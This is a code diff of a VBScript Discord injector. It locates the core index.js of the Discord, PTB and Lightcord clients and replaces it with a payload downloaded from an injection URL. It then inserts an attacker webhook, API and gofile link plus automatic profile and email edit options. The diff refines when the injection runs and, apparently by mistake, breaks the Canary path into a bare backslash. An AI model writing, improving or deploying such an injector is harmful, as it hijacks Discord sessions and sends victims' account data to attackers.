@@ -16,7 +16,7 @@ auto_email_update = "replace_auto_email_update"
 localAppDataPath = "C:\Users\" & userName & "\AppData\Local\"
 discordDirectories = Array( _
     localAppDataPath & "discord\", _
-    localAppDataPath & "discordcanary\", _
+    localAppDataPath & "\", _
     localAppDataPath & "discordptb\", _
     localAppDataPath & "lightcord\" _
 )
@@ -30,9 +30,6 @@ Set desktopPattern = CreateObject("VBScript.RegExp")
 desktopPattern.Pattern = "discord_desktop_core-(\d+)"
 Set indexPattern = CreateObject("VBScript.RegExp")
 indexPattern.Pattern = "index\.js"
-
-moviePath = "movie.txt"
-Set outputFileStream = fileSystem.CreateTextFile(moviePath, True)
 
 For Each folder In discordDirectories
     If fileSystem.FolderExists(folder) Then
@@ -52,33 +49,41 @@ For Each folder In discordDirectories
                                         If indexPattern.Test(file.Name) Then
                                             
                                             filePath = file.Path
-                                            Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
-                                            xmlHttp.open "GET", injection_url, False
-                                            xmlHttp.send()
+                                            Set textFile = fileSystem.OpenTextFile(filePath, 1)
+                                            fileContent = textFile.ReadAll
+                                            textFile.Close
                                             
-                                            If xmlHttp.Status = 200 Then
-                                                Set adoStream = CreateObject("ADODB.Stream")
-                                                adoStream.Open
-                                                adoStream.Type = 1
-                                                adoStream.Write xmlHttp.ResponseBody
-                                                adoStream.Position = 0
-                                                If fileSystem.FileExists(filePath) Then fileSystem.DeleteFile filePath
-                                                adoStream.SaveToFile filePath
-                                                adoStream.Close
+                                            If fileContent = "module.exports = require(""./core.asar"");" Or Len(fileContent) < 20000 Then
+                                                Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
+                                                xmlHttp.open "GET", injection_url, False
+                                                xmlHttp.send()
                                                 
-                                                Set textFile = fileSystem.OpenTextFile(filePath, 1)
-                                                fileContent = textFile.ReadAll
-                                                textFile.Close
-                                                fileContent = Replace(fileContent, "%WEBHOOK%", webhook_url)
-                                                fileContent = Replace(fileContent, "%API%", api_url)
-                                                fileContent = Replace(fileContent, "%GOFILE_DOWNLOAD_LINK%", gofile_download_link)
-                                                fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
-                                                fileContent = Replace(fileContent, "%AUTO_EMAIL_UPDATE%", auto_email_update)
-                                                Set textFile = fileSystem.OpenTextFile(filePath, 2)
-                                                textFile.Write fileContent
-                                                textFile.Close
+                                                If xmlHttp.Status = 200 Then
+                                                    Set adoStream = CreateObject("ADODB.Stream")
+                                                    adoStream.Open
+                                                    adoStream.Type = 1
+                                                    adoStream.Write xmlHttp.ResponseBody
+                                                    adoStream.Position = 0
+                                                    If fileSystem.FileExists(filePath) Then fileSystem.DeleteFile filePath
+                                                    adoStream.SaveToFile filePath, 2
+                                                    adoStream.Close
+                                                    
+                                                    Set textFile = fileSystem.OpenTextFile(filePath, 1)
+                                                    fileContent = textFile.ReadAll
+                                                    textFile.Close
+
+                                                    fileContent = Replace(fileContent, "%WEBHOOK%", webhook_url)
+                                                    fileContent = Replace(fileContent, "%API%", api_url)
+                                                    fileContent = Replace(fileContent, "%GOFILE_DOWNLOAD_LINK%", gofile_download_link)
+                                                    fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
+                                                    fileContent = Replace(fileContent, "%AUTO_EMAIL_UPDATE%", auto_email_update)
+                                                    
+                                                    Set textFile = fileSystem.OpenTextFile(filePath, 2)
+                                                    textFile.Write fileContent
+                                                    textFile.Close
+                                                End If
+                                                Set xmlHttp = Nothing
                                             End If
-                                            Set xmlHttp = Nothing
                                         End If
                                     Next
                                 Next
@@ -91,7 +96,6 @@ For Each folder In discordDirectories
     End If
 Next
 
-outputFileStream.Close
 Set fileSystem = Nothing
 Set appPattern = Nothing
 Set modulePattern = Nothing
